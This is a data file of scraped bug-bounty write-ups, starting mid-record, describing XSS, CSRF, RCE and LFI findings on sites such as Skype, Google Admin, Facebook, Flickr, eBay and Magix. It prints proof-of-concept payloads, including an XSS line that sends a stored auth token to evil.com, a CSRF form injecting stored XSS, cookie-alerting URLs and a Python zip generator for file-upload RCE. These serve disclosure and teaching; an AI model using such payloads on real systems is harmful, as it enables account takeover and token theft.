using login CSRF (same video as before) The JavaScript to do this can be found here . It is long and ugly, as well as a bit noisy, and I won’t go through it. It essentially pulls down the plugin.zip file from the attacker’s server³, and replicates the requests that would be sent if the plugin were to be uploaded through the web interface. Using the Impersonation Functionality Initially, Moodle only fixed the CSRF on the login form, though this still allowed the issue to be exploited using Moodle’s impersonation functionality instead. Rather than exploiting login CSRF, an attacker would have to convince an administrator to impersonate their account, causing the administrator to view the attacker’s dashboard. The exact same scripts are then used to exploit this issue. Targeting an administrator using the impersonation functionality Disclosure Timeline 2018–08–18: Issue reported to Moodle with details of exploiting using login CSRF. 2018–08–25: Details of exploiting using impersonation functionality added to issue. 2018–10–25: Asked to create a separate ticket for the exploitation using the impersonation functionality. 2018–11–12: Login CSRF patched (Moodle versions 3.1.15, 3.3.9, 3.4.6, 3.5.3). CVE-2018–16854 and MSA-18-0020 assigned. 2019–03–11: Moodle now sets the forceclean parameter to true when in an impersonated session to prevent user controlled JavaScript from being included in user’s dashboards (Moodle versions 3.1.17, 3.4.8, 3.5.5, 3.6.3). CVE-2019–3847 and MSA-19-0004 assigned. Footnotes ¹ Other browsers untested. ² The attacker’s server must return the header Access-Control-Allow-Origin: * or equivalent along with the result of this script to allow the value to be read by JavaScript cross-domain on line 10. ³ Again this needs to be returned with the Access-Control-Allow-Origin: * header. Xss Self Xss Login Csrf -- -- 3 Written by Daniel Thatcher 30 followers · 1 following Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@jayateerthag/multiple-xss-in-skype-com-2-18cfed39edbd", "title": "Multiple xss in *.skype.com (2). PART 2: | by Jayateertha Guruprasad | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@jayateerthag/multiple-xss-in-skype-com-2-18cfed39edbd. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMultiple xss in *.skype.com (2). PART 2: | by Jayateertha Guruprasad | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Multiple xss in *.skype.com (2) Jayateertha Guruprasad 2 min read · Apr 10, 2019 -- 1 Listen Share PART 2: So If you have read the part 1, You would have seen that I found a stored-self Xss in manager.skype.com which was getting escalated in the option(“make the USER as admin of group_name”) as group_name was not properly sanitized there. Here’s what I did to affect other users,You just need to create a invite link and make a user join your group. Once ,the user joins your group ,You just need to make him as admin using the option I mentioned earlier.(requires no user interactions once he joins the group) Once user is made as admin ,He will now see the same option called (“make the USER as admin of group_name”), where the gropu_name was not sanitized and xss gets executed successfully on the user also!!! Press enter or click to view image in full size So It all ended??? No, I did more research and put a BXSS payload “><script src=”malicious_script_url”> in group_name. Now add a member by sending the member a invite link. Press enter or click to view image in full size Once the member clicks the invite link,and accepts it , xss was getting executed in another sub domain too( secure.skype.com) !!! The BXSS payload used was provided by xsshunter ,through which I was able to get user details like screenshot of affected page,user cookies,headers,device informations,ip address etc!!! This has hell lot of information ,which is sufficient to compromise user data and also account takeover. Press enter or click to view image in full size Press enter or click to view image in full size Then ,I made a final report combining all my research and sent them (secure@microsoft.com) Finally ,I was acknowledged by Microsoft at their security researchers acknowledgement page(FEB-2019): https://portal.msrc.microsoft.com/en-us/security-guidance/researcher-acknowledgments-online-services Press enter or click to view image in full size Press enter or click to view image in full size Security Xss Microsoft Microsoft Bug Bug Bounty -- -- 1 Written by Jayateertha Guruprasad 383 followers · 39 following I get paid for breaking things ! Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/csrf-attack-can-lead-to-stored-xss-f40ba91f1e4f", "title": "CSRF Attack can lead to Stored XSS | by Mohamed Sayed | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/csrf-attack-can-lead-to-stored-xss-f40ba91f1e4f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nCSRF Attack can lead to Stored XSS | by Mohamed Sayed | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication CSRF Attack can lead to Stored XSS Mohamed Sayed 2 min read · Apr 25, 2019 -- Listen Share Press enter or click to view image in full size Heeeeeey guys, I’m here again with a new write up about CSRF with XSS :P. First a few days ago I was testing a website lets call it example.com and I found a subdomain on this website which includes some functions so I start to test it I found a Self-Stored XSS on a description field which allows HTML tags and I found a CSRF attack to add the XSS payload but there is a problem I should get the template ID to edit it and I can’t Brute Force it on this time I left it alone, nowadays when I return to test I opened my Burp and caught requests I found an interesting request I sent it to Repeater and sent it again and I found that a new template added to my template list WOW this is good, I scanned the request and I didn’t found any CSRF protection the cool thing in the request include the template ID which I can use it to add some contents on the template fields in this time I remembered the old bug which is Self-Stored XSS so I tried to exploit these two bugs together to get Strored XSS I created an HTML file as POC this is the code <form action=\" https://subdomain.example.com/endpoint \" method=\"POST\"> <input type=\"text\" name=\"svcid\" value=\"WRKSPC_LAYER_SERVICE\"><br> <input type=\"text\" name=\"stok\" value=\"\"><br> <input type=\"text\" name=\"v\" value=\"0\"><br> <input type=\"text\" name=\"clientType\" value=\"\"><br> <input type=\"text\" name=\"request\" value='{\"basePage\":{\"draftIds\":[\"1514844016810\"],\"wsId\":\"-1\",\"wsType\":\"-1\"},\"fields\":{\"title\":\"CSRF_1\",\"bold\":\"false\"},\"fields\":{\"description\":\"<font rwr=\\\"1\\\" style=\\\"font-family:Arial\\\" size=\\\"4\\\"><br>\\\"&gt;<svg onload=\\\"alert(cookie)\\\">\\n</svg></font>\",\"rteMode\":\"0\"},\"mode\":\"INDIVIDUAL\",\"action\":\"SAVE\",\"layerName\":\"EDITPANE\",\"variation\":null,\"currencyInfo\":{\"currencySymbolLeft\":true,\"singularName\":\"U.S. dollars\",\"moneySymbol\":\"$\",\"decimalSymbol\":\".\",\"groupingSymbol\":\",\",\"gS\":\",\",\"decimalPlaces\":\"2\",\"currencyCode\":\"USD\",\"pluralName\":\"U.S. dollar\"},\"singleList\":true,\"listingMode\":\"AddItem\",\"updateRequired\":true,\"customFields\":{},\"byPassUpdate\":false,\"sellerType\":\"C2C\",\"saveUlsi\":true,\"edpCrNew\":false,\"deletedFields\":[],\"customAttributes\":{\"PL_SELLER_ELIGIBLE\":\"1\",\"PL_FORMAT_ELIGIBLE\":\"1\",\"PL_CATEGORY_ELIGIBLE\":\"1\",\"PL_ALREADY_OPTED\":\"0\"},\"draftMode\":\"Listing\",\"restricted\":false,\"customPreference\":{\"preferences\":{\"scheduleStartTime\":true,\"reservePrice\":true,\"sellAsLot\":true,\"privateListing\":true,\"salesTax\":true},\"sellerDetails\":[\"BUSINESS_POLICY\",\"NO_STORE_SUBSCRIPTION\",\"NO_SHIPPING_DISCOUNTS\",\"NON_SM_SELLER\"]},\"payments20\":false,\"templateId\":5553489011,\"isvShown\":false}'><br> <input type=\"submit\" value=\"send\"> </form> this code will send a request to edit a template with id 1514844016810 so the server will not found a template with this id so he will create it and add the new value which is the XSS payload which added to the description, when the victim visits his template list he will found a new one so he will open it and BOOOM the XSS payload will be executed, I was: I hope you enjoy it guys goodbye see you soon. JavaScript Xss Vulnerability Csrf -- -- Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Mohamed Sayed 549 followers · 36 following My name is Mohamed my nickname is Flex, I’m a Bug Hunter at HackerOne and Synack Red Team Member. No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@heinthantzin/how-i-was-able-to-turn-self-xss-into-reflected-xss-850e3d5a2beb", "title": "How I was able to turn self xss into reflected xss | by Hein Thant Zin | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@heinthantzin/how-i-was-able-to-turn-self-xss-into-reflected-xss-850e3d5a2beb. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I was able to turn self xss into reflected xss | by Hein Thant Zin | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I was able to turn self xss into reflected xss Hein Thant Zin 2 min read · Mar 31, 2019 -- 1 Listen Share Hello there , I’m Hein Thant Zin and just a noob bug hunter .Today , I would like to share about one of my recent finding in HackerOne ‘s private program. Let’s say https://reacted.com When I’m testing on this site , there is a function which you can transfer money to another account via wallet address. https://reacted.com/manage/transfer I put xss payload in this field and payload was automatically executed but nothing happened coz they filtered wallet adderss must start with ‘xyz’ and having 98 characters long . So , I prepared my payload like that , xyzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<img src=x onerror=confirm(document.domain)> then when I put above payload xss was fired :”) Me was like But this is basically self xss which is not exploitable other users .So , how can i exploit other users ? I was thinking about it and about 15 minutes later , I noticed that they were provided to fill wallet address in two ways Copy / Paste Scanning QR image What happens if an attacker encode his xss payload as QR image and send it to victim to transfer money ? I encoded my payload like that Press enter or click to view image in full size And then I scanned my qr code and payload was automatically executed then pop up alert . That is enough to exploit other users coz there is no need user action to execute payload and encoded QR image can’t visible as plaintext. I quickly wrote report and reported to security team.They triaged my report and awarded $300 bounty for my finding. :”) Thanks for reading……. -- -- 1 Written by Hein Thant Zin 137 followers · 44 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@bughunter.sec7/stored-xss-in-the-guides-gameplayversion-www-dota2-com-775fa9a1889b", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@bughunter.sec7/stored-xss-in-the-guides-gameplayversion-www-dota2-com-775fa9a1889b. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://buer.haus/2015/01/21/admin-google-com-reflected-cross-site-scripting-xss/", "title": "admin.google.com Reflected Cross-Site Scripting (XSS) | ziot", "friendly_explanation": "This is a bug bounty writeup from https://buer.haus/2015/01/21/admin-google-com-reflected-cross-site-scripting-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nadmin.google.com Reflected Cross-Site Scripting (XSS) | ziot Menu Skip to content BLOG RESUME TWITTER < Back admin.google.com Reflected Cross-Site Scripting (XSS) January 21, 2015 February 25, 2024 After learning about Google's bug bounty program , I decided to look for vulnerabilities on their most sensitive services. Finding a vulnerability on admin.google.com was challenging; I managed to find a simple, but interesting form of Cross-Site Scripting . Details: URL: https://admin.google.com/ Proof of Concept: https://admin.google.com/mrzioto.com/ServiceNotAllowed?service=grandcentral&continue=javascript:alert(document.cookie);// admin.google.com is a part of Google Apps service where you are able to configure permissions, users, and Google Services for your domain. This is a feature primarily used by businesses, especially ones that are using Gmail as the e-mail service for their domain. The ServiceNotAllowed page appears when you are attempting to access a Google app service that has not been configured for your domain. It requires that you are logged into at least two accounts and will give you a form to switch accounts to continue to the service you were trying to load. When you select an account via the bullet on the page, it executes JavaScript to redirect your browser. The URL used in this JavaScript is supplied by the user in the continue request parameter. The continue request parameter is fairly common request variable in the Google login flow. This is the only page that I could find that did not validate the URL passed into it. This allowed you to craft Cross-Site Scripting attacks by using \"javascript:\" as part of the URL and it would execute when the browser location is redirected. Attack: Impact: This attack allows you to force a Google Apps admin to execute any request on the admin.google.com domain. Some things that are possible: Forcing the admin to ... Create new users with any permission level that you want, such as a super admin. Disable security settings for individual accounts or for multiple domains. This includes removing two-factor authentication (2FA) from accounts. Modifying domain settings so they point to your domain/dns, therefore all incoming emails to that domain are redirected to you instead. Hijack an account/email by resetting the password, disabling 2FA, and also removing login challenges temporarily for 10 minutes. To demonstrate this, I built a proof-of-concept that shows a JavaScript payload pulling information from the Admin console, grabbing a list of users, changing the password and removing security settings from the first user in the list. Source: http://imageshar.es/54b8489989b9403e17000006/file <form action=\"\" onsubmit=\"return onContinueClick(2);\"> <ul> <li><input type=\"radio\" value=\"javascript:alert(document.cookie);//?authuser=0\" checked name=\"radioChoices\" id=\"radioid0\"><label for=\"radio0\">email1@gmail.com</label></li> <li><input type=\"radio\" value=\"javascript:alert(document.cookie);//?authuser=0\" checked name=\"radioChoices\" id=\"radioid1\"><label for=\"radio1\">email2@mrzioto.com</label></li> </ul> </form> <script> function onContinueClick(accountCount) { var href; for (var i = 0; i < accountCount; i++) { if (document.getElementById('radioid' + i).checked) { href = document.getElementById('radioid' + i).value; } window.location.href = href; return false; } window.addEventListener(\"load\", function() { document.getElementById(\"radioid0\").focus(); }); </script> Timeline: Discovered and reported: 9/1/14 Acknowledged: 9/5/14 Fixed: 9/18/14 Bounty Reward:"}
{"source_url": "https://buer.haus/2014/06/16/facebook-stored-cross-site-scripting-xss-badges/", "title": "Facebook – Stored Cross-Site Scripting (XSS) – Badges | ziot", "friendly_explanation": "This is a bug bounty writeup from https://buer.haus/2014/06/16/facebook-stored-cross-site-scripting-xss-badges/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFacebook – Stored Cross-Site Scripting (XSS) – Badges | ziot Menu Skip to content BLOG RESUME TWITTER < Back Facebook – Stored Cross-Site Scripting (XSS) – Badges June 16, 2014 February 25, 2024 The Facebook badges page was vulnerable to stored Cross-Site Scripting (XSS). This was initially reported back in August 2013, but due to communication problems over e-mail it wasn't fixed until early January. Neither party is to blame, but this shows some of the difficulties that companies can face communicating with security researchers. This problem hit the media earlier this year when a Facebook security report was not clearly understood and led to the exploit being abused on Mark Zuckerberg's wall. Facebook recently moved their Whitehat communication to their support dashboard instead of over e-mail which is going to help the company and security testers tremendously. The Exploit Sample request: URL: https://www.facebook.com/badges/profile.php POST: fb_dtsg=& layout=horiz &items%5B%5D=badge_profile_pic&items%5B%5D=badge_test&items%5B%5D=badge_hometown&items%5B%5D=badge_email&items%5B%5D=badge_mobile_status&save=Save&bid=2421&badge_type=0&wizard=badges&owner_id=4 When this request is sent, it would return the following source: Source: <div class=\"badge_holder bh_ horiz \"> The layout request variable was being saved to a database and pulled into the <div>'s class. Because the input was not encoded, it allowed you to break out of the div and inject HTML. Example URL: https://www.facebook.com/badges/profile.php POST: fb_dtsg=&layout= \"><b> &items%5B%5D=badge_profile_pic&items%5B%5D=badge_test&items%5B%5D=badge_hometown&items%5B%5D=badge_email&items%5B%5D=badge_mobile_status&save=Save&bid=2421&badge_type=0&wizard=badges&owner_id=4 Screenshot: Normally I would show an iframe or script alert as an example, but this is the only screenshot I still have of this. The entire badge page has since been completely overhauled and no longer functions in a way that a string is passed by the client to a database to be saved. The Danger Although this could force you to save JavaScript/HTML on your badges page, the impact of it is quite small. This request is protected by fb_dtsg which is a csrftoken and Facebook has X-Frame-Options preventing clickjacking. That means no one can force you to make this request, you would have to damage yourself or the attacker would have to already have access to your Facebook. Even still, you would have to visit the badge page in order for it to execute. I'm going to bet a lot of you haven't even heard of the badge page until you read this. Regardless, XSS is XSS! It can force you to execute any action protected by a csrftoken and extract information from your Facebook. That means forcing you to make Facebook posts or stealing private data that you didn't want public. The Bug Submitted: August 2013 Fixed: January 2014"}
{"source_url": "http://blog.h4rsh4d.com/2019/04/stealing-local-storage-data-through-xss.html", "title": "Stealing local storage data through XSS", "friendly_explanation": "This is a bug bounty writeup from http://blog.h4rsh4d.com/2019/04/stealing-local-storage-data-through-xss.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStealing local storage data through XSS Skip to main content Search This Blog Security Blog By @h4rsh4d Stealing local storage data through XSS Get link Facebook X Pinterest Email Other Apps April 25, 2019 Stealing local storage data through XSS In this blog, I'm going to show how to steal local storage data and one of my same finding on bugcrowd.😀 See screen shot below which is storing sensitive data in Local Storage. Local Storage. Its easy to steal this Local stored data through javascript localStorage.getItem() function. lets alert this data through console for demonstration. Payload : alert(localStorage.getItem('access_token')) Simple Example through Console I have found same challenge previously on bugcrowd private program. Authorisation token was responsible to handle web application session but they are storing that authorisation token in local storage. which is not a good way to protect session tokens. So i manged to find Stored XSS on that program and that XSS is getting executed on Admin Account. Bingo !! 😜 it take me 2 min to craft payload and steal that authorisation token. ezpz 😎 I submitted that vulnerability as Stored XSS to Admin Account Takeover. 😅 Final Payload : <img src=x onerror=\"document.location='https://evil.com?key='+window.localStorage.getItem('simple_auth:session')\"> JavaScript will pickup local storage data and concat it to end of the string at the time of onerror event handler execution. after that it will redirect to evil.com with data. i.e local stored data. Redirection towards attackers server. Attacker server received Local Stored data Note : it's recommended not to store sensitive information in local storage. 😂 Bounty awarded : $800 (Happy with it) 😄 Thanks for Readings .. 💜💜💚 Get link Facebook X Pinterest Email Other Apps Comments Smaran 27 April 2019 at 05:30 Nice one brother. Reply Delete Replies Reply Add comment Load more... Post a Comment Popular posts from this blog March 17, 2018 OLX Reflected XSS on Resend Code link !! This is my first write up ! sharing is caring !! 😎 This is not big finding , just one of my noob xss that i have found on OLX.in To change password , OLX firstly sends OTP to registered phone number and hold on for user to enter OTP number but on the same page they have provided the link which resend code (which get highlight after some seconds if user failed to enter the code) so i checked the request and response of that resend code functionality and its pretty sending mobile number and hash as parameter ph=\"phone number\" & h=\"hash\" I changed that default user \"ph\" value to victims number but no luck because of another parameter \"h=xxxxxxxxxxxxxxxxxxxx\" (hash) 😫 So after that i decided to test for XSS on same functionality and found one ! ✌😜 OLX Reflected XSS I checked the context and entered payload in \"ph\" parameter ph= \" onmouseover=\"alert... Read more open redirect bypass August 09, 2022 Simple Open Redirect Bypass. Was checking the login page for XSS and other stuff. noticed that the login page had one hidden parameter. \" returnToUrl \" Here, Application had some server-side protection which was checking user input URL's. Payload : https://google.com : forbidden Payload : //google.com : forbidden Payload: https://142.250.188.4 : forbidden Bypass Payload: https: /// google.com https://example.com/something/do/login?returnToUrl=https: /// google.com 💜 Read more Powered by Blogger Theme images by Radius Images Harshad Gaikwad Twitter : @h4rsh4d Linkedin : https://in.linkedin.com/in/h4rsh4d Visit profile Archive August 2022 1 June 2020 1 April 2019 1 March 2018 1"}
{"source_url": "https://www.rcesecurity.com/2014/04/magix-bug-bounty-magix-com-rce-sqli-and-xara-com-lfi-xss/", "title": "Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) | RCE Security", "friendly_explanation": "This is a bug bounty writeup from https://www.rcesecurity.com/2014/04/magix-bug-bounty-magix-com-rce-sqli-and-xara-com-lfi-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMagix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) | RCE Security Home About Contact Us Services Research Select Page Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) by Julien Ahrens | Saturday, April 26, 2014 | Advisory | 0 comments The German Magix Software GmbH rewarded me with a Hall of Fame listing and a free Magix Music Maker 2014 Premium license for my reports of several serious security issues in the online infrastructures of magix.com and xara.com, which could be used to break both sites entirely: At this point, I’d like to thank the Magix Security Team for their really fast and always transparent responses and the good coordination process as a whole. This is a perfect example of how the communication between the bug bounty operator and the researcher can satisfy both parties. The fixes for the critical vulnerabilities (RCE, SQLi, LFI) were implemented quite fast within only a few days after my initial report (!) , the fix for the XSS took a bit longer, but it’s still acceptable for a medium-severity issue. Bug Bounty programs are always a great challenge and sometimes you’re rewarded with pretty cool stuff and great references like this – now here’s a short write-up about the discovered vulnerabilities, which already have been fixed by Magix. Remote Code Execution on europe.magix.com This is the most dangerous flaw, I’ve found while working on this bug bounty program. I’ve discovered a script, that allows an attacker to upload zip files via a HTTP POST request. The script accepts any zip file, renames it to some temporary name and finally extracts the .zip file to a worker directory without checking if the zip file contains a valid file. Additionally, the extracted contents were accessible via www – I think the problem is quite obvious. To prove the exploitability to Magix, I wrote a short Python script. The following snippet shows how the quite handy Python ZipFile function can be used to dynamically generate a zip file in memory. The .zip file contains one single file named “/tmp/test.php” with a custom PHP payload. #!/usr/bin/python import zipfile from StringIO import StringIO import zlib inMemoryFile = StringIO() zipFile = zipfile.ZipFile(inMemoryFile, 'w', zipfile.ZIP_DEFLATED) zipFile.writestr('./tmp/test.php', '<?php echo \\\"www.rcesecurity.com\\\"; ?>') zipFile.close() In case of Magix, the target script echoes some additional (and hazardous) debugging output after POSTing an arbitrary zip file: looks like Magix missed to deactivate this output – without this I wouldn’t have probably found this flaw 🙂 Since the debugging output also discloses the full-path of the extracted file, this leads to a nice RCE condition: Now imagine an attacker who’d upload some malicious C99… SQL Injection on europe.magix.com This vulnerability is more or less based on the same condition like the previously described RCE flaw. If the zip file contains a specially prepared .ini file, the same script, that is responsible for the RCE flaw, uses the .ini values unfiletered in a SQL query: Local File Inclusion on downloadsv9.xara.com A local file inclusion could become as dangerous as a RCE flaw, because an attacker may read sensitive system files like /etc/passwd: …and if you’ve got a lazy sysadmin who likes to chmod 777 on files and directories, even more might by revealed 😉 Cross-Site Scripting on downloadsv9.xara.com OK – I promised not to write about a XSS in detail anymore, so I’ll leave you with the PoC screenshot: A real happy day for bug bounty hunters and Magix! X RSS Designed by Elegant Themes | Powered by WordPress"}
{"source_url": "https://whitton.io/articles/content-types-and-xss-facebook-studio/", "title": "Content Types and XSS: Facebook Studio – Jack", "friendly_explanation": "This is a bug bounty writeup from https://whitton.io/articles/content-types-and-xss-facebook-studio/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nContent Types and XSS: Facebook Studio – Jack Open Menu Home About Jack I participate in bug bounty programmes Learn More Email Twitter GitHub Posts All Posts All Tags Image source: _robson_ Content Types and XSS: Facebook Studio October 21, 2013 Reading time ~1 minute I’ve found a few bugs on various Facebook satellite/marketing domains (ones which are part of the Facebook brand, but not necessarily hosted/developed by them, and not under the *.facebook.com domain). Most of them aren’t that serious. This one isn’t an exception, and I wouldn’t normally blog about it, but it’s an interesting use case as to why content types are important. The bug is an XSS discovered on Facebook Studio . This is linked to by some Facebook marketing pages, and is used to showcase advertising campaigns on Facebook. There is an area which allows you to submit work to the Gallery . This form conveniently has an option to scrape details from your Facebook page and fill in boxes for you (such as Company Name, Description). This calls an AJAX end-point with your pages URL as a parameter. If we set our pages description to something containing HTML/Javascript, it’s properly escaped. However, it’s escaped client-side. The end-point incorrectly sends a content-type header of text/html , when the response is actually JSON. When browsed to directly (it doesn’t need any CSRF tokens to be viewed, despite the hash param), we see our script executed. The cool thing about this bug is that whilst it’s not persistent (the payload is fetched when the page is visited), the code is not present in the request body, therefore avoiding Chrome’s XSS Auditor and IE’s XSS Filter. Had the content type been set to application/json , the code would have not run (until you start to consider content sniffing…). Fix The content type is now set correctly. Timeline 15th August 2013 - Issue Reported 21st August 2013 - Acknowledgment of Report 21st August 2013 - Issue Fixed facebook bugbounty websec xss Updated on October 21, 2013 Jack Like Tweet +1 Read More From Bug Bounty Hunter, to Engineer, and Beyond A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a \"new chapter\" in my ...… Continue reading Obtaining Login Tokens for an Outlook, Office or Azure Account Published on April 03, 2016 Uber Bug Bounty: Turning Self-XSS into Good-XSS Published on March 22, 2016 © 2020 Jack. Powered by Jekyll using the HPSTR Theme ."}
{"source_url": "https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/", "title": "Abusing CORS for an XSS on Flickr – Jack", "friendly_explanation": "This is a bug bounty writeup from https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAbusing CORS for an XSS on Flickr – Jack Open Menu Home About Jack I participate in bug bounty programmes Learn More Email Twitter GitHub Posts All Posts All Tags Image source: _robson_ Abusing CORS for an XSS on Flickr December 12, 2013 Reading time ~1 minute I recently found an XSS on the mobile version of Flickr ( http://m.flickr.com ). Due to the way the bug is triggered, I thought it deserved a write-up. Whilst browsing the site, you’ll notice that pages are loaded via AJAX with the path stored in the URL fragment (not as common these days now that pushState is available). When the page is loaded, a function, q() (seen below), is called which will check the value of location.hash , and call F.iphone.showSelectedPage() . In order to load pages from the current domain, it checks for a leading slash. If this isn’t present, it prepends one when calling the next function, F.iphone.showPageByHref() . This function then performs a regex on the URL (line 160) to ensure that it’ll only load links from m.flickr.com . If this check fails, and the URL starts with a double slash (relative protocol link), it prepends it with http://m.flickr.com . Pretty solid check, right? Incase you didn’t notice, the first regex doesn’t anchor it to the start of the string. This means we can bypass it providing our own URL contains m.flickr.com . We can get our own external page loaded by passing in a URL like so: //fin1te.net/flickr.php?bypass=m.flickr.com The code will check for a leading slash (we have two :)), which it’ll pass, then checks for the domain, which will also pass, then load it via AJAX. Since we now have CORS in modern browsers, the browser will send an initial OPTIONS request to the page (to ensure it’ll allow it to be loaded), then the real request. All we need to do is specify a couple of headers (the additional options in the Access-Control-Allow-Headers are to prevent syntax errors in the Javascript), along with our payload. The next part of the Javascript dumps the response into an element with innerHTML . Which leads to our payload being executed. Fix This issue is now fixed by anchoring the regex to the start of the string, and also running another regex to check if it starts with a double slash. websec bugbounty yahoo flickr xss cors Updated on December 12, 2013 Jack Like Tweet +1 Read More From Bug Bounty Hunter, to Engineer, and Beyond A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a \"new chapter\" in my ...… Continue reading Obtaining Login Tokens for an Outlook, Office or Azure Account Published on April 03, 2016 Uber Bug Bounty: Turning Self-XSS into Good-XSS Published on March 22, 2016 © 2020 Jack. Powered by Jekyll using the HPSTR Theme ."}
{"source_url": "https://www.rcesecurity.com/2013/04/paypal-bug-bounty-paypaltech-com-xss/", "title": "PayPal Bug Bounty: PayPaltech.com XSS | RCE Security", "friendly_explanation": "This is a bug bounty writeup from https://www.rcesecurity.com/2013/04/paypal-bug-bounty-paypaltech-com-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPayPal Bug Bounty: PayPaltech.com XSS | RCE Security Home About Contact Us Services Research Select Page PayPal Bug Bounty: PayPaltech.com XSS by Julien Ahrens | Saturday, April 13, 2013 | Bug Bounty | 0 comments Great news! Today I received the second payment for another valid Cross-Site Scripting vulnerability covered by PayPal’s bug bounty program. This time the domain www.paypaltech.com was affected, which provides scripts and samples used for Instant Payment Notifications (IPNs). Sometimes … being on the ethical side of hacking feels good … 🙂 X RSS Designed by Elegant Themes | Powered by WordPress"}
{"source_url": "https://thehackerblog.com/ebay-mobile-reflected-xss-disclosure-writeup/index.html", "title": "eBay Mobile Reflected XSS  Disclosure Writeup – The Hacker Blog", "friendly_explanation": "This is a bug bounty writeup from https://thehackerblog.com/ebay-mobile-reflected-xss-disclosure-writeup/index.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\neBay Mobile Reflected XSS Disclosure Writeup – The Hacker Blog The Hacker Blog FlashHTTPRequest JudasDNS XSS Hunter tarnish Home eBay Mobile Reflected XSS Disclosure Writeup June 05, 2014 Reading time ~1 minute Home tarnish XSS Hunter JudasDNS FlashHTTPRequest | Follow @IAmMandatory eBay Mobile Reflected XSS Disclosure Writeup Thought Iâd write a post on my experience with eBayâs security submission team and also to keep an archive of my various bug submissions. The vulnerability was reflected XSS due to improper sanitation of a user inputted parameter itemId in eBay mobile. Found it manually by just tampering inputs and watching the output. The XSS Yummy Cookies http://m.ebay.com/recfb?sid= adoramacamera&itemId= 331087337021%22%20onclick%3D% 22alert%28document.cookie%29 Yep, it was really that simple, oddly enough. I reported it initially and got an automated response stating to not contact them with the bug statusÂ for any reason and that they would get back to me eventually. So I waitedâ¦and waitedâ¦and waited. A few months later I felt that I had waited more than enough â I understand they are most likely busy but I contacted them. Turns out they had lost the message! Oops! After resubmitting the bug to them they added me to the eBay hall of fame promptly and everything was smooth from there. Overall Iâd say eBay was a very nice and straightforward company to report to. Even though they donât run a proper bug bounty program the hall of fame is always cool for researchers For those looking to report vulnerabilities in eBay check out this link to submit:Â http://ebay.com/securitycenter/Researchers.html The eBay hall of fame:Â http://ebay.com/securitycenter/ResearchersAcknowledgement.html Until next time, -mandatory cross site scripting ebay ebay bug bounty ebay mobile xss ebay security team ebay submission ebay xss hall of fame Matthew Bryant (mandatory) Like Tweet +1 About the Author Matthew Bryant (mandatory) Security researcher who needs to sleep more. Opinions expressed are solely my own and do not express the views or opinions of my employer. Follow @mandatoryprogrammer Follow @IAmMandatory Read More \"Zero-Days\" Without Incident - Compromising Angular via Expired npm Publisher Email Domains **NOTE:** *If you're just looking for the high level points, see the\"[The TL;DR Summary & High-LevelPoints](#the-tldr-summary--high-level...… Continue reading Video Downloader and Video Downloader Plus Chrome Extension Hijack Exploit - UXSS via CSP Bypass (~15.5 Million Affected) Published on February 22, 2019 Kicking the Rims – A Guide for Securely Writing and Auditing Chrome Extensions Published on June 12, 2018 © 2022 Matthew Bryant (mandatory). Powered by Jekyll using the Neo-HPSTR Theme ."}
